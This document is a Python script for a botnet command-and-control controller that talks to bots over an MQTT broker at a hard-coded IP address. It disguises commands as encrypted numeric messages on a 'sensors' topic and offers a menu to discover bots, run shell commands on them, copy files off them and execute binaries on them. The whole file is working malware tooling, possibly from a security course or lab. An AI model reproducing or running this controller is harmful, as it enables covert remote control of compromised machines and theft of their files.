import time
import random
import paho.mqtt.client as mqtt
from AESCipher import *
from config import *

cipher = AESCipher()
discovered_bots = []
pending_params = {}  
def on_message(client, userdata, message):
    try:
        payload = message.payload
        
        if isinstance(payload, bytes):
            payload_str = payload.decode('utf-8')
        else:
            payload_str = str(payload)
        
        if payload_str.isdigit() and not is_valid_command(payload_str):
            return
        
        try:
            response = cipher.decrypt(payload)
            print(f"\n[BOT RESPONSE]: {response}\n")
            if response.startswith("BOT_ALIVE:"):
                bot_id = response.split(":")[1]
                if bot_id not in discovered_bots:
                    discovered_bots.append(bot_id)
        except:
            pass
    except Exception as e:
        None

def on_connect(client, userdata, flags, reason_code, properties):
    client.subscribe("sensors")

def on_publish(client, userdata, mid, reason_code, properties):
    try:
        userdata.remove(mid)
    except KeyError:
        pass

def send_command(mqttc, unacked_publish, cmd_type, param=None):
    if param:
        cmd_num, param_data = encode_command(cmd_type, param)
        msg_info = mqttc.publish("sensors", payload=cmd_num, qos=1)
        unacked_publish.add(msg_info.mid)
        while len(unacked_publish):
            time.sleep(0.1)
        msg_info.wait_for_publish()
        
        time.sleep(random.uniform(0.1, 0.3))
        encrypted_param = cipher.encrypt(param_data)
        msg_info2 = mqttc.publish("sensors", payload=encrypted_param, qos=1)
        unacked_publish.add(msg_info2.mid)
        while len(unacked_publish):
            time.sleep(0.1)
        msg_info2.wait_for_publish()
    else:
        cmd_num = encode_command(cmd_type)
        msg_info = mqttc.publish("sensors", payload=cmd_num, qos=1)
        unacked_publish.add(msg_info.mid)
        while len(unacked_publish):
            time.sleep(0.1)
        msg_info.wait_for_publish()

unacked_publish = set()
mqttc = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2)
mqttc.on_publish = on_publish
mqttc.on_message = on_message
mqttc.on_connect = on_connect
mqttc.user_data_set(unacked_publish)
mqttc.connect("147.32.82.209", 1883)
mqttc.loop_start()

time.sleep(1)

while True:
    print("=" * 60)
    print("MQTT C&C Controller Menu")
    print("=" * 60)
    print("1. Announce - Discover all bots")
    print("2. List users (w command)")
    print("3. List directory (ls command)")
    print("4. Get user ID (id command)")
    print("5. Copy file from bot")
    print("6. Execute binary on bot")
    print("7. Show discovered bots")
    print("0. Exit")
    print("=" * 60)
    
    choice = input("Select option: ").strip()
    
    if choice == "1":
        send_command(mqttc, unacked_publish, "ANNOUNCE")
        time.sleep(2)
    elif choice == "2":
        send_command(mqttc, unacked_publish, "CMD:w")
        time.sleep(2)
    elif choice == "3":
        path = input("Enter directory path: ").strip()
        send_command(mqttc, unacked_publish, "CMD:ls", path)
        time.sleep(2)
    elif choice == "4":
        send_command(mqttc, unacked_publish, "CMD:id")
        time.sleep(2)
    elif choice == "5":
        filepath = input("Enter file path to copy: ").strip()
        send_command(mqttc, unacked_publish, "COPY", filepath)
        time.sleep(2)
    elif choice == "6":
        binary = input("Enter binary path to execute: ").strip()
        send_command(mqttc, unacked_publish, "EXEC", binary)
        time.sleep(2)
    elif choice == "7":
        print(f"\nDiscovered bots: {discovered_bots if discovered_bots else 'None'}\n")
    elif choice == "0":
        break

mqttc.disconnect()
mqttc.loop_stop()